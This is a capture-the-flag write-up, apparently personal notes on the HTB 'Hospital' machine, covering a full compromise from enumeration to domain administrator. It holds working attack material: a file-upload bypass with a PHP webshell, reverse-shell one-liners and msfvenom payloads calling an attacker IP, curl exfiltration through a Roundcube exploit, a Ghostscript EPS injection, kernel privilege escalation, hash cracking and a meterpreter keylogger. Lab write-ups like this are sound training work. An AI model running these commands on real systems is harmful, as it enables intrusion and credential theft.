@@ -1,0 +1,934 @@
+==
+tags: #windows #medium #php-file-upload-attack #phar
+=
+
+* nmap
+  #+begin_src bat
+  sudo nmap -sV -sC -oA nmap/hospital.basic 10.129.229.189
+
+PORT     STATE SERVICE           VERSION
+22/tcp   open  ssh               OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 e1:4b:4b:3a:6d:18:66:69:39:f7:aa:74:b3:16:0a:aa (ECDSA)
+|_  256 96:c1:dc:d8:97:20:95:e7:01:5f:20:a2:43:61:cb:ca (ED25519)
+53/tcp   open  domain            Simple DNS Plus
+88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2026-08-07 16:20:14Z)
+135/tcp  open  msrpc             Microsoft Windows RPC
+139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
+389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=DC
+| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
+| Not valid before: 2023-09-06T10:49:03
+|_Not valid after:  2028-09-06T10:49:03
+443/tcp  open  ssl/http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
+| tls-alpn:
+|_  http/1.1
+| ssl-cert: Subject: commonName=localhost
+| Not valid before: 2009-11-10T23:48:47
+|_Not valid after:  2019-11-08T23:48:47
+|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
+|_http-title: Hospital Webmail :: Welcome to Hospital Webmail
+|_ssl-date: TLS randomness does not represent time
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ldapssl?
+| ssl-cert: Subject: commonName=DC
+| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
+| Not valid before: 2023-09-06T10:49:03
+|_Not valid after:  2028-09-06T10:49:03
+1801/tcp open  msmq?
+2103/tcp open  msrpc             Microsoft Windows RPC
+2105/tcp open  msrpc             Microsoft Windows RPC
+2107/tcp open  msrpc             Microsoft Windows RPC
+2179/tcp open  vmrdp?
+3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=DC
+| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
+| Not valid before: 2023-09-06T10:49:03
+|_Not valid after:  2028-09-06T10:49:03
+3269/tcp open  globalcatLDAPssl?
+| ssl-cert: Subject: commonName=DC
+| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
+| Not valid before: 2023-09-06T10:49:03
+|_Not valid after:  2028-09-06T10:49:03
+3389/tcp open  ms-wbt-server     Microsoft Terminal Services
+| ssl-cert: Subject: commonName=DC.hospital.htb
+| Not valid before: 2026-08-06T15:46:16
+|_Not valid after:  2027-02-05T15:46:16
+| rdp-ntlm-info:
+|   Target_Name: HOSPITAL
+|   NetBIOS_Domain_Name: HOSPITAL
+|   NetBIOS_Computer_Name: DC
+|   DNS_Domain_Name: hospital.htb
+|   DNS_Computer_Name: DC.hospital.htb
+|   DNS_Tree_Name: hospital.htb
+|   Product_Version: 10.0.17763
+|_  System_Time: 2026-08-07T16:21:07+00:00
+5985/tcp open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+8080/tcp open  http              Apache httpd 2.4.55 ((Ubuntu))
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-server-header: Apache/2.4.55 (Ubuntu)
+Service Info: Host: DC; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode:
+|   3:1:1:
+  #+end_src
+* full scan
+   #+begin_src bat
+   sudo nmap -p- -A -T4 -oA nmap/hospital.full 10.129.229.189
+   #+end_src
+* smb
+ #+begin_src bat
+ $ nxc smb 10.129.229.189 -u 'guest' -p '' --shares
+
+[*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:hospital.htb) (signing:True) (SMBv1:None)
+[-] hospital.htb\guest: STATUS_ACCOUNT_DISABLED 
+                                                                     
+ $ nxc smb 10.129.229.189 -u '' -p '' --shares
+
+[*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:hospital.htb) (signing:True) (SMBv1:None)
+[-] hospital.htb\: STATUS_ACCESS_DENIED 
+[-] Error enumerating shares: Error occurs while reading from remote(104)
+                                                                        
+ $ nxc smb 10.129.229.189 -u 'noone' -p '' --shares 
+
+[*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:hospital.htb) (signing:True) (SMBv1:None)
+[-] hospital.htb\sguest: STATUS_LOGON_FAILURE 
+ #+end_src
+* port 443
+  there is a webmail application built with [[https://roundcube.net/][Roundcube]]; there's a login form
+* port 8080                                                          :ATTACH:
+  :PROPERTIES:
+  :ID:       7ca4bc42-436f-4bd7-86b4-b052f21fe07c
+  :END:
+  an interesting thing is that nmap says it's hosted on linux (maybe wsl?)
+  #+begin_src 
+  8080/tcp open  http              Apache httpd 2.4.55 ((Ubuntu))
+  #+end_src
+  a php application with a registration form; create an account with creds:
+  #+begin_src 
+  test: tester
+  #+end_src
+  after logging in, there's a file upload page; 
+  [[attachment:2026-08-07_12-56.png]]
+  it allows us to upload image files by default; after a successful upload,
+  redirects to =/success.php=
+* try uploading a php reverse shell
+  #+begin_src bat
+  msfvenom -p php/reverse_php LHOST=10.10.17.95 LPORT=4444 -f raw > reverse.php
+  #+end_src
+  when changing the upload type from the default =images= to =all files=, we're able to upload it, but it fails and we get redirected to =/failed.php=
+  renaming it to =reverse.php.png= is uploaded successfully; the =/upload/= endpoint is forbidden.
+  intercepting the request and changing the filename and content in burp also
+  leads to the same result
+  #+begin_src bash
+  Content-Disposition: form-data; name="image"; filename="shell.php"
+  Content-Type: image/png
+
+ <?php system($_REQUEST['cmd']); ?>
+  #+end_src
+  looks like it applies a *blacklist filter* and prevents filenames with a =php=
+  extension from being uploaded, but lets other stuff in
+* fuzzing
+** directory plus page
+   #+begin_src bat
+   gobuster dir -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -x php -o gobuster.out -u http://10.129.229.189:8080/
+   #+end_src
+   let's filter ther results:
+   #+begin_src bat
+   $ cat gobuster.out | grep -Ev '(Size: 0)|(Status: 403)'
+
+images       (Status: 301) [--> http://10.129.229.189:8080/images/]
+login.php    (Status: 200) 
+js           (Status: 301) [--> http://10.129.229.189:8080/js/]
+css          (Status: 301) [--> http://10.129.229.189:8080/css/]
+register.php (Status: 200) 
+uploads      (Status: 301) [--> http://10.129.229.189:8080/uploads/]
+fonts        (Status: 301) [--> http://10.129.229.189:8080/fonts/]
+success.php  (Status: 200) 
+vendor       (Status: 301) [--> http://10.129.229.189:8080/vendor/]
+failed.php   (Status: 200) 
+   #+end_src
+   all the =301s= are forbidden.
+   in addition to this, there's an =upload.php= file (size 0, so not shown)
+** vhost fuzzing 
+    #+begin_src bat
+    wfuzz -c -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u 10.129.229.189 -H "Host: FUZZ.hospital.htb" --hc 301
+    #+end_src
+* the uploads directory                                              :ATTACH:
+  :PROPERTIES:
+  :ID:       5e8afc07-f479-4de3-9df3-b4df911ac147
+  :END:
+  turns out we're able to access the uploaded files directly by supplying the
+  full path:
+  [[attachment:2026-08-08_10-39.png]] 
+* xss
+  :PROPERTIES:
+  :ID:       a2fba9db-0054-4ae1-a07e-7a0cd93ced9b
+  :END:
+  uploading files with xml payloads
+  #+begin_src xml
+  <?xml version="1.0" encoding="UTF-8"?>
+  <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+  <svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
+    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
+    <script type="text/javascript">alert(window.origin);</script>
+  </svg>
+  #+end_src
+  results in:
+  [[attachment:2026-08-08_11-47.png]] 
+* xxe payloads                                                       :ATTACH:
+  :PROPERTIES:
+  :ID:       bc44452c-0c06-438c-b3cf-d2e11b4da956
+  :END:
+  however, neither of these worked
+  #+begin_src xml
+  <?xml version="1.0" encoding="UTF-8"?>
+  <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+  <svg>&xxe;</svg>
+  #+end_src
+    #+begin_src xml
+  <?xml version="1.0" encoding="UTF-8"?>
+  <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
+  <svg>&xxe;</svg>
+  #+end_src
+  [[attachment:2026-08-08_11-53.png]]
+  but on checking with curl, it's evident the file has not been sanitized:
+  #+begin_src bash
+  $ curl http://hospital.htb:8080/uploads/upload.svg
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:.//upload.php"> ]>
+<svg>&xxe;</svg>
+  #+end_src
+* fuzz for working extensions                                        :ATTACH:
+  :PROPERTIES:
+  :ID:       9f003252-0e90-4209-88d2-ce8ce5937d0e
+  :END:
+  it's evident this application is using [[file:c:/Users/shyam/Documents/code/htb/academy/modules/file-upload-attacks/blacklist-filters.org::*Blacklisting Extensions][blacklist-filters]] to prevent php files from being uploaded.
+  so we can fuzz for php extensions that do work; we can use the [[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst][list from PayloadAllTheThings]];
+  run a sniper attack via burpsuite and we see most of these work:
+  [[attachment:2026-08-09_10-25.png]]
+  however, it was still hard to get it to work - in that the actual file was inaccessible
+  eventually i landed upon a =phar= extension as shown in the section.
+  sending an =echo= payload worked:
+  [[attachment:2026-08-09_10-29.png]]
+  and it prints:
+  [[attachment:2026-08-09_10-31.png]]
+* webshell                                                           :ATTACH:
+  :PROPERTIES:
+  :ID:       da91f5bf-2996-447b-8853-a3309aa3ab12
+  :END:
+  use [[https://github.com/WhiteWinterWolf/wwwolf-php-webshell/blob/master/webshell.php][whitewinterwolf's php webshell]] and rename it to =webshell.phar=; we see:
+  [[attachment:2026-08-09_10-56.png]]
+* reverse shell
+  tried the reverse shell payload from earlier, however, it seems to not behave correctly - a connection is established, but there's no output
+  tried the [[https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php][pentestmonkey shell]] as well; however, it errors out:
+  #+begin_src 
+  WARNING: Failed to daemonise. This is quite common and not fatal. ERROR: Can't spawn shell 
+  #+end_src
+** issue command via webshell
+   got this from revshells.com
+   #+begin_src bash
+   php -r '$sock=fsockopen("10.10.17.115",4444);system("sh <&3 >&3 2>&3");'
+   #+end_src
+* exfiltration
+  #+begin_src bash
+  cat ../config.php
+
+<?php
+/* Database credentials. Assuming you are running MySQL
+server with default setting (user 'root' with no password) */
+define('DB_SERVER', 'localhost');
+define('DB_USERNAME', 'root');
+define('DB_PASSWORD', 'my$qls3rv1c3!');
+define('DB_NAME', 'hospital');
+ 
+/* Attempt to connect to MySQL database */
+$link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);
+ 
+// Check connection
+if($link === false){
+    die("ERROR: Could not connect. " . mysqli_connect_error());
+}
+?>
+  #+end_src
+** contents of .htaccess
+   #+begin_src 
+   AddType application/x-httpd-php .phar 
+   #+end_src
+   this essentially allows =.phar= to be treated as php scripts
+** mysql
+   #+begin_src bat
+   mysql -u root -pmy$qls3rv1c3! hospital
+   #+end_src
+   this fails, however, entering the password on the commandline works;
+   but there's somehting not quite right with the shell output and the query
+   results are printed only on writing =exit;=
+   #+begin_src sql
+   select * from users;
+   exit
+   id      username        password        created_at
+   1       admin   $2y$10$caGIEbf9DBF7ddlByqCkrexkt0cPseJJ5FiVO1cnhG.3NLrxcjMh2    2023-09-21 
+   2       patient $2y$10$a.lNstD7JdiNYxEepKf1/OZ5EM5wngYrf.m5RxXCgSud7MVU6/tgO    2023-09-21 
+   3       test    $2y$10$ezadNDPEBi2pLD8IdcznoeVRXKYsNROOz9v6himutF7FoSDl/S2Ni    2026-08-09 
+   #+end_src
+   after cracking the password, it turns out it's just =admin: 123456=, and
+   =patient: patient=. also, it's useless. tried the =patient= creds with smb as well.
+** read passwd
+   #+begin_src
+   drwilliams:x:1000:1000:Lucy Williams:/home/drwilliams:/bin/bash 
+   #+end_src
+** hunt for drwilliams creds
+   #+begin_src bat
+   grep -rnw "drwilliams" / 2>/dev/null
+   #+end_src
+** find files owned by www-data
+   #+begin_src bat
+   find / -group www-data 2>/dev/null
+   #+end_src
+** find files writable by www-data
+   #+begin_src bash
+   find / -writable -not -path "/proc/*" -not -path "/sys/*" -not -path "/dev/*" -not -path "/run/*" -not -path "/snap/*" 2>/dev/null
+   #+end_src
+** linpeas
+   ran this; thought it didn't discover anything which stood out; however,
+   having used the guided mode, looks like it's a kernel exploit;
+** kernel version
+   #+begin_src bat
+   uname -r
+
+5.19.0-35-generic
+   #+end_src
+** pwnkit
+   transferred the pwnkit exploit
+  #+begin_src bat
+  $ gcc cve-2021-4034-poc.c -o poc
+  $ ./poc
+  #+end_src
+  nothing happens.
+** GameOverlay (CVE-2023-2640, CVE-2023-32629)
+   googling exploits for the kernel version leads to
+   #+begin_src 
+   GameOver(lay), a local privilege escalation flaw tracked as CVE-2023-2640 and CVE-2023-32629. These flaws exist in Ubuntu's custom OverlayFS implementation, allowing an unprivileged local user to gain root access
+   #+end_src
+   [[https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629/blob/main/exploit.sh][this repository]] gives a working poc
+** root
+   just running the exploit gives us the root shell
+   the hint also suggests looking at =/etc/shadow= and we can see the drwilliams' hash
+   #+begin_src bat
+   cat /etc/shadow
+
+root:$y$j9T$s/Aqv48x449udndpLC6eC.$WUkrXgkW46N4xdpnhMoax7US.JgyJSeobZ1dzDs..dD:19612:0:99999:7:::
+
+   <SNIP>
+drwilliams:$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:19612:0:99999:7:::
+   #+end_src
+** crack drwilliams hash
+   the hash is =sha512=
+   #+begin_src bat
+   $ hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt
+
+qwe123!@#
+   #+end_src
+* drwilliams user
+  the only thing on the user's home directory is a =go= directory; tried the creds on the roundcube app, but didn't work
+** smb
+   #+begin_src bat
+   nxc smb 10.129.229.189 -u 'drwilliams' -p 'qwe123!@#' --shares
+
+SMB         [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:hospital.htb) (signing:True) (SMBv1:None)
+SMB         [+] hospital.htb\drwilliams:qwe123!@# 
+SMB         [*] Enumerated shares
+SMB         Share           Permissions     Remark
+SMB         -----           -----------     ------
+SMB         ADMIN$                          Remote Admin
+SMB         C$                              Default share
+SMB         IPC$            READ            Remote IPC
+SMB         NETLOGON        READ            Logon server share 
+SMB         SYSVOL          READ            Logon server share 
+   #+end_src
+** enumerate users
+   #+begin_src bat
+   $ nxc smb 10.129.229.189 -u drwilliams -p 'qwe123!@#' --users
+
+SMB [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:hospital.htb) (signing:True) (SMBv1:None)
+SMB [+] hospital.htb\drwilliams:qwe123!@# 
+SMB -Username-                    -Last PW Set-       -BadPW- -Description-
+SMB Administrator                 2023-09-12 07:58:44 0       Built-in account for administering the computer/domain
+SMB Guest                         <never>             0       Built-in account for guest access to the computer/domain
+SMB krbtgt                        2023-09-05 19:58:33 0       Key Distribution Center Service Account
+<SNIP>
+SMB drbrown                       2023-09-06 14:53:27 0        
+SMB drwilliams                    2023-09-08 17:33:46 0        
+SMB [*] Enumerated 15 local users: HOSPITAL
+   #+end_src
+** rdp
+   #+begin_src bat
+   $ xfreerdp /v:10.129.229.189 /u:drwilliams /p:'qwe123!@#' /size:1920x1080
+   #+end_src
+   fails
+** bloodhound
+   #+begin_src bat
+   $ rusthound-ce -u drwilliams -p 'qwe123!@#' -d 'DC.hospital.htb' -c All --zip
+
+[2026-08-11T09:37:31Z INFO  rusthound_ce] Verbosity level: Info
+[2026-08-11T09:37:31Z INFO  rusthound_ce] Collection method: All
+[2026-08-11T09:37:31Z ERROR rusthound_ce::ldap] Failed to authenticate to DC.HOSPITAL.HTB Active Directory. Reason: LDAP operation result: rc=49 (invalidCredentials), dn: "", text: "80090308: LdapErr: DSID-0C090569, comment: AcceptSecurityContext error, data 52e, v4563"
+   #+end_src
+   this is because the domain shouldn't contain =dc=
+   #+begin_src bat
+   $ rusthound-ce -u drwilliams -p 'qwe123!@#' -d 'hospital.htb' -c All
+
+[2026-08-11T09:39:26Z INFO  rusthound_ce] Verbosity level: Info
+[2026-08-11T09:39:26Z INFO  rusthound_ce] Collection method: All
+[2026-08-11T09:39:26Z ERROR rusthound_ce::ldap] Failed to authenticate to HOSPITAL.HTB Active Directory. Reason: LDAP operation result: rc=8 (strongerAuthRequired), dn: "", text: "00002028: LdapErr: DSID-0C090389, comment: The server requires binds to turn on integrity checking if SSL\TLS are not already active on the connection, data 0, v4563"
+   #+end_src
+   ok, we should use =--ldaps=:
+   #+begin_src bat
+   rusthound-ce --ldaps -u drwilliams -p 'qwe123!@#' -d 'hospital.htb' -c All
+   #+end_src
+   looking at the results, it doesn't look like =drwilliams= is part of any special group
+** roundcube
+   retried logging in to the roundcube app and it worked. the earlier issue
+   was to do with cache or something i guess.
+   there's one mail in the inbox from =drbrown@hospital.htb=:
+   #+begin_src 
+   Sub: Needle designs for Darius Simion. 
+
+   Dear Lucy,
+
+   I wanted to remind you that the project for lighter, cheaper and
+   environmentally friendly needles is still ongoing. You are the one in
+   charge of providing me with the designs for these so that I can take
+   them to the 3D printing department and start producing them right away.
+   Please make the design in an ".eps" file format so that it can be well
+   visualized with GhostScript.
+
+   Best regards,
+   Chris Brown.
+   #+end_src
+** SYSVOL
+   #+begin_src bat
+   $ smbclient -U drwilliams //10.129.229.189/SYSVOL
+
+   smb: \> ls
+  .                                   D        0  Tue Sep  5 21:57:07 2023
+  ..                                  D        0  Tue Sep  5 21:57:07 2023
+  hospital.htb                       Dr        0  Tue Sep  5 21:57:07 2023
+
+                9640703 blocks of size 4096. 1023005 blocks available
+smb: \> recurse ON
+smb: \> prompt OFF
+smb: \> mget *
+   #+end_src
+   #+begin_src 
+   $ tree hospital.htb                               
+
+hospital.htb
+|- DfsrPrivate
+|- Policies
+|   |- {31B2F340-016D-11D2-945F-00C04FB984F9}
+|   |   |- GPT.INI
+|   |   |- MACHINE
+|   |   |   |- Microsoft
+|   |   |   |   |- Windows NT
+|   |   |   |       |- SecEdit
+|   |   |   |           |- GptTmpl.inf
+|   |   |   |- Registry.pol
+|   |   |- USER
+|   |- {6AC1786C-016F-11D2-945F-00C04fB984F9}
+|       |- GPT.INI
+|       |- MACHINE
+|       |   |- Microsoft
+|       |   |   |- Windows NT
+|       |   |       |- SecEdit
+|       |   |           |- GptTmpl.inf
+|       |   |- Scripts
+|       |       |- Shutdown
+|       |       |- Startup
+|       |- USER
+|- scripts
+   #+end_src
+** NETLOGON
+   #+begin_src bat
+   $ smbclient -U drwilliams //10.129.229.189/NETLOGON
+   #+end_src
+   empty.
+** ssh
+   #+begin_src bat
+   ssh drwilliams@10.129.229.189
+   #+end_src
+   this is the web server, so nothing new.
+** asreproast
+   #+begin_src bat
+   nxc ldap dc.hospital.htb -u users.txt -p '' --asreproast asreproast.out
+   #+end_src
+   exits without any output; even =--verbose= doesn't help much
+   let's use =GetNPUsers=
+   #+begin_src 
+   impacket-GetNPUsers hospital.htb/ -dc-ip 10.129.229.189 -no-pass -usersfile users.txt
+
+[-] User drwilliams doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User drbrown doesn't have UF_DONT_REQUIRE_PREAUTH set
+   #+end_src
+** gpp_autologin
+   #+begin_src 
+   nxc smb 10.129.229.189 -u drwilliams -p 'qwe123!@#' -M gpp_autologin
+
+GPP_AUTO... 10.129.229.189  445    DC               [+] Found SYSVOL share
+GPP_AUTO... 10.129.229.189  445    DC               [*] Searching for Registry.xml
+   #+end_src
+   well that doesn't exist, of course.
+** certipy
+   #+begin_src bat
+   certipy find -u 'drwilliams@hospital.htb' -p 'qwe123!@#' -dc-ip 10.129.229.189 -stdout
+
+[*] Finding certificate templates
+[*] Found 0 certificate templates
+[*] Finding certificate authorities
+[*] Found 0 certificate authorities
+[*] Found 0 enabled certificate templates
+[*] Finding issuance policies
+[*] Found 1 issuance policy
+[*] Found 0 OIDs linked to templates
+[*] Enumeration output:
+Certificate Authorities                 : [!] Could not find any CAs
+Certificate Templates                   : [!] Could not find any certificate templates
+   #+end_src
+** roundcube cve
+   the version is =Roundcube Webmail 1.6.4=
+   #+begin_src 
+   $ php CVE-2025-49113.php https://hospital.htb drwilliams 'qwe123!@#' "curl http://10.10.17.115:8123/$(id | base64 -w0)"
+
+[+] Starting exploit (CVE-2025-49113)...
+[*] Checking Roundcube version...
+PHP Warning:  file_get_contents(): SSL operation failed with code 1. OpenSSL Error messages:
+error:0A000086:SSL routines::certificate verify failed in CVE-2025-49113.php on line 32
+PHP Warning:  file_get_contents(): Failed to enable crypto in CVE-2025-49113.php on line 32
+PHP Warning:  file_get_contents(https://hospital.htb): Failed to open stream: operation failed in CVE-2025-49113.php on line 32
+[-] Error: Failed to check version.
+   #+end_src
+   needed to add an ssl block to all the request contexts;
+   #+begin_src bash
+   $context = stream_context_create([
+    'http' => [
+        'method' => 'GET',
+        'header' => "User-Agent: Roundcube exploit CVE-2025-49113 - Hakai Security\r\n",
+        'ignore_errors' => true,
+    ],
+    'ssl' => [
+        'verify_peer' => false,
+        'verify_peer_name' => false,
+    ],
+]);
+   #+end_src
+   the exploit ran, however, i did not get a call back
+   #+begin_src bash
+   $ php CVE-2025-49113.php https://hospital.htb drwilliams 'qwe123!@#' 'iwr http://10.10.17.115:8123/$(whoami)'
+
+[+] Starting exploit (CVE-2025-49113)...
+[*] Checking Roundcube version...
+[*] Detected Roundcube version: 10604
+[+] Target is vulnerable!
+[+] Login successful!
+[*] Exploiting...
+[+] Gadget uploaded successfully!
+   #+end_src
+   #+begin_src bat
+   $ python -m http.server 8123
+
+Serving HTTP on 0.0.0.0 port 8123 (http://0.0.0.0:8123/) ...
+   #+end_src
+   outbound requests are probably blocked.
+** try sending a mail with a payload hidden in an eps file
+   #+begin_src bat
+   $ echo -n "iwr http://10.10.17.115:8123" | base64 
+
+aXdyIGh0dHA6Ly8xMC4xMC4xNy4xMTU6ODEyMw==
+   #+end_src
+   eps file:
+   #+begin_src bat
+   $ cat payload.eps                      
+
+%!PS-Adobe-3.0 EPSF-3.0
+%%BoundingBox: 0 0 100 100
+%%EndComments
+% This is a normal graphic command area
+newpath
+10 10 moveto
+20 20 lineto
+stroke
+%%EOF
+%PAYLOAD_START
+aXdyIGh0dHA6Ly8xMC4xMC4xNy4xMTU6ODEyMw==
+%PAYLOAD_END
+   #+end_src
+** ghostscript CVE
+   found [[https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection.git][this]]; the reverse shell payload there assumes linux, so changed it
+   to be the base64 powershell payload from revshells.com and it worked
+   #+begin_src bat
+   python CVE_2023_36664_exploit.py --generate --revshell -ip 10.10.17.175 -port 4444 --filename trigger_revshell --extension eps
+   #+end_src
+   nc:
+   #+begin_src 
+   $ rlwrap nc -lvnp 4444                            
+
+listening on [any] 4444 ...
+connect to [10.10.17.115] from (UNKNOWN) [10.129.229.189] 6139
+whoami
+hospital\drbrown
+   #+end_src
+* user flag
+  #+begin_src 
+  PS C:\Users\drbrown.HOSPITAL\Desktop> cat user.txt
+ 
+25b61efb49cbcd457667f36074d4c9ed
+  #+end_src
+* check for saved creds 
+  #+begin_src bat
+  C:\htb> cmdkey /list
+
+Currently stored credentials:
+,* NONE *
+  #+end_src
+* confirm it's the DC
+  #+begin_src 
+  PS C:\Users\drbrown.HOSPITAL> hostname
+
+DC
+
+  PS C:\Users\drbrown.HOSPITAL> ipconfig
+
+IPv4 Address. . . . . . . . . . . : 10.129.229.189
+  #+end_src
+* drbrown creds
+  look around and find a =bat= script in =Documents=
+  #+begin_src bat
+  PS C:\Users\drbrown.HOSPITAL> type Documents/ghostscript.bat
+
+@echo off
+set filename=%~1
+powershell -command "$p = convertto-securestring 'chr!$br0wn' -asplain -force;$c = new-object system.management.automation.pscredential('hospital\drbrown', $p);Invoke-Command -ComputerName dc -Credential $c -ScriptBlock { cmd.exe /c "C:\Program` Files\gs\gs10.01.1\bin\gswin64c.exe" -dNOSAFER "C:\Users\drbrown.HOSPITAL\Downloads\%filename%" }"
+  #+end_src
+  so the drbrown creds are:
+  #+begin_src 
+  drbrown: chr!$br0wn
+  #+end_src
+  this would have been quite easy to bruteforce with hydra rules.
+* evil-winrm
+  #+begin_src bat
+  $ evil-winrm -i hospital.htb -u drbrown -p 'chr!$br0wn'
+  #+end_src
+* rdp                                                                :ATTACH:
+  :PROPERTIES:
+  :ID:       bfaec578-17ac-4ccb-84b2-6caacffde5f2
+  :END:
+  #+begin_src bat
+  xfreerdp /v:10.129.229.189 /u:drbrown /p:'chr!$br0wn' /size:1920x1080
+  #+end_src
+  opens to the admin webmail:
+  [[attachment:2026-08-12_14-30.png]]
+  creds:
+  #+begin_src 
+  Admin: Th3B3stH0sp1t4l9786!
+  #+end_src
+** check if this works for admin privs on powershell
+   tried this with username =admin= and it didn't work; however it worked with
+   the username =Administrator= which can be seen from the =net users= output
+   is the correct one
+** root flag
+   #+begin_src bat
+   PS C:\Users\Administrator\Desktop> type root.txt
+
+0b8c15442f27c431e2f1f0b2798e1f60
+  #+end_src
+  +however, this looks like it must have been an artifact?+ no, ippsec mentions
+  this as a legitimate way to escalate this box
+* users
+  #+begin_src bat
+  PS C:\Users\drbrown.HOSPITAL> net users
+
+User accounts for \\DC
+
+-------------------------------------------------------------------------------
+Administrator            drbrown                  krbtgt
+The command completed successfully.
+  #+end_src
+* drbrown privs
+  #+begin_src bat
+  PS C:\Users\drbrown.HOSPITAL> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== ========
+SeMachineAccountPrivilege     Add workstations to domain     Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
+  #+end_src
+* proceed via evil-winrm
+  since we're not certain this is the intended path, let's try another way
+** winpeas
+   winpeas reveals this:
+   #+begin_src bat
+   Apache2.4(Apache Software Foundation - Apache2.4)["C:\xampp\apache\bin\httpd.exe" -k runservice] - Autoload
+   Possible DLL Hijacking in binary folder: C:\xampp\apache\bin (Users [Allow: AppendData/CreateDirectories WriteData/CreateFiles])
+   Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
+   #+end_src
+* OFFICIAL SOLUTION
+  suggests 2 ways to privesc neither of which are exactly what we found.
+  but they don't use rdp at all, so perhaps they just missed it?
+** method 1 - via keylogging
+   they change to a meterpreter shell, look at processes and find the
+   =iexplorer= one we found via rdp; they use meterpreter's keylogger to then
+   find the password submitted.
+*** generate shell with msfvenom
+    #+begin_src bat
+    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.17.115 LPORT=4444 -f exe > shell.exe
+    #+end_src
+    upload via the evil-winrm session
+*** meterpreter
+    #+begin_src bat
+    msf > use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+
+    msf exploit(multi/handler) >  set payload windows/x64/meterpreter/reverse_tcp
+
+    msf exploit(multi/handler) > set lhost tun0
+
+    msf exploit(multi/handler) > set lport 4444
+
+    msf exploit(multi/handler) > run
+[*] Started reverse TCP handler on 10.10.17.115:4444 
+    #+end_src
+    now, run =shell.exe= on the target and we get a session.
+    #+begin_src 
+    meterpreter> ps
+
+2860  7020  iexplore.exe         x64   1        HOSPITAL\drbrown  C:\Program Files\internet explorer\iexplore.exe 
+    #+end_src
+    we notice this process running
+*** check currently logged in users
+    #+begin_src bat
+    meterpreter > shell
+
+Process 1596 created.
+Channel 1 created.
+Microsoft Windows [Version 10.0.17763.4974]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Users\drbrown.HOSPITAL\Documents>qwinsta
+
+ SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE
+>services                                    0  Disc
+ console           drbrown                   1  Active
+ rdp-tcp                                 65536  Listen
+    #+end_src
+    so there's an active console session; from this and the fact that
+    =internet explorer= is running, we can conclude someone is currently using
+    a browser; so it makes sense to run a keylogger;
+*** run keylogger
+    to do this, we migrate to the =explorer= process and start the keylogger
+    with =keyscan_start=, wait a couple of minutes and get the dump:
+    #+begin_src 
+    meterpreter > migrate 2860
+
+[*] Migrating from 7008 to 2860...
+[*] Migration completed successfully.
+
+    meterpreter > keyscan_start
+Starting the keystroke sniffer ...
+
+    meterpreter > keyscan_dump
+Dumping captured keystrokes...
+AdministratorTh3B3stH0sp1t4l9786!
+    #+end_src
+** Method 2 - permissions
+   like we discovered via the winpeas run, there are some permissions on the
+   =xampp= directory, but we focused on the wrong thing.
+   under the =Check if you can modify installed software=, we see:
+   #+begin_src
+   C:\xampp(Users [Allow: AppendData/CreateDirectories WriteData/CreateFiles])
+   #+end_src
+   let's confirm if we can edit the =htdocs= directory with =icacl=:
+   #+begin_src bat
+   ,*Evil-WinRM* PS C:\xampp> icacls htdocs
+
